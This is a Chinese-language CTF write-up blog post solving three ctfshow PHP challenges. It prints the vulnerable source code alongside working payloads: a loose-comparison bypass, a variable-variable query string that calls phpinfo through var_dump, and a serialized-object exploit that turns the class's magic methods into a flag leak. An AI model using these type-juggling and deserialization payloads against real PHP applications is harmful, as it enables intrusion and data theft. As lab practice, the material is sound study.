+++
title = "年CTF2023"
slug = "year-ctf-2023"
description = "刷"
date = "2024-08-15T13:31:31"
lastmod = "2024-08-15T13:31:31"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["php"]
+++

# 除夕

```php
Notice: Undefined index: year in /var/www/html/index.php on line 16
<?php


include "flag.php";

$year = $_GET['year'];

if($year==2022 && $year+1!==2023){
    echo $flag;
}else{
    highlight_file(__FILE__);
} 
```

直接就绕过了，也算是半个特性吧

```
/index.php?year=2022.0
```

# 初三

```php
<?php


error_reporting(0);
extract($_GET);
include "flag.php";
highlight_file(__FILE__);


$_=function($__,$___){
    return $__==$___?$___:$__;
};
$$__($_($_GET{
    $___
}[$____]{
    $_____
}(),$flag));
```
这段代码很S,我只能说

```php
$_=function($__,$___){
    return $__==$___?$___:$__;
};
传参$__和$___如果二者相等则返回$___不然返回$__
```
上面的格式写出来很难看我们把他放在一起

```php
$$__($_($_GET{$___}[$____]{$_____}(),$flag));
这样子就好看了，函数$__传参两个一个是$_GET{$___}[$____]{$_____}()，一个是flag
然后在php特性中[$a]和{$a}是等效的
我们只要$_GET[$___][$____][$_____]和flag相等就可以
但是外面这个$$__我们还没说是啥这个是可控的我们可以让他为一个打印的函数就可以把返回的flag打印出来
由于弱比较所以我们就可以数组绕过
```
然后呢这里我问了几个师傅都是说的是二维数组，由a来当数组名这么来理解然后

```php
phpinfo会等于$flag
绕过弱比较
```

原因是为什么呢，我们去理解一下`phpinfo`是什么

`phpinfo()` 是 PHP 中的一个内置函数，它用于输出有关当前 PHP 环境的详细信息，包括 PHP 编译选项、扩展模块、PHP 配置设置、服务器信息、环境变量、HTTP 头信息等。

所以就是相当的了

```php
?__=x&x=var_dump&___=a&____=b&_____=c&a[b][c]=phpinfo
```

# 初六

```php
<?php


include "flag.php";

class happy2year{

    private $secret;
    private $key;

    function __wakeup(){
        $this->secret="";
    }
    
    function __call($method,$argv){
        
        return call_user_func($this->key, array($method,$argv));
    }


    function getSecret($key){
        $key=$key?$key:$this->key;  //如果存在key那么就为原值不然把$this->key赋值给key
        return $this->createSecret($key);    
    }


    function createSecret($key){
        return base64_encode($this->key.$this->secret);
    }

    function __get($arg){
        global $flag;
        $arg="get".$arg;
        $this->$arg = $flag;
        return $this->secret;
    }

    function __set($arg,$argv){
        $this->secret=base64_encode($arg.$argv);
        
    }

    function __invoke(){
        
        return $this->$secret;
    }
    

    function __toString(){
    
        return base64_encode($this->secret().$this->secret);
    }

    
    function __destruct(){
        
        $this->secret = "";
    }
    


}

highlight_file(__FILE__);
error_reporting(0);
$data=$_POST['data'];
$key = $_POST['key'];
$obj = unserialize($data);
if($obj){
    $secret = $obj->getSecret($key);
    print("你提交的key是".$key."\n生成的secret是".$secret);
} 
```
这次是真学到了，之前我只知道回调函数的利用但是不知道原理

```php
function __call($method,$argv){
        
        return call_user_func($this->key, array($method,$argv));
    }
当调用不存在的方法时就会回调使得key可控
```

```php
这里有一个重点就是$this
当$this在__construct中是被新创建的下面的EXP中也没有为其赋值，所以他代表的就是对象实例但是并没有具体的值
而另一种$this就是来引用
类似：$this->key="baozongwi"来赋值
```
审计版
```php
<?php


include "flag.php";

class happy2year{

    private $secret;
    private $key;

    function __wakeup(){
        $this->secret="";   //让secret为空
    }
    
    function __call($method,$argv){
        
        return call_user_func($this->key, array($method,$argv));  //回调可控使得我命令key为$this
    }


    function getSecret($key){
        $key=$key?$key:$this->key;  //如果存在key那么就为原值不然把$this->key赋值给key
        return $this->createSecret($key);    
    }


    function createSecret($key){
        return base64_encode($this->key.$this->secret);  //由于secret为空所以返回的是$this 的base64值
    }

    function __get($arg){
        global $flag;       //全局变量   $flag
        $arg="get".$arg;     
        $this->$arg = $flag;       //之前不是说到$this 没有具体的值嘛，这里有了把flag赋值给$arg
        return $this->secret;                
    }

    function __set($arg,$argv){
        $this->secret=base64_encode($arg.$argv);   //这里再进行一次编码
        
    }

    function __invoke(){
        
        return $this->$secret;
    }
    

    function __toString(){
    
        return base64_encode($this->secret().$this->secret);    //再次编码所以最后得到的flag只需要三次解码而不是四次
    }

    
    function __destruct(){
        
        $this->secret = "";  //清空
    }
    


}
```

EXP
```php
<?php
class happy2year{
    private $secret;
    private $key;
    
    function __construct(){
        $this->key=$this;
    }
}
echo urlencode(serialize(new happy2year()));
?>
```
然后就会得到经过base64加密的flag
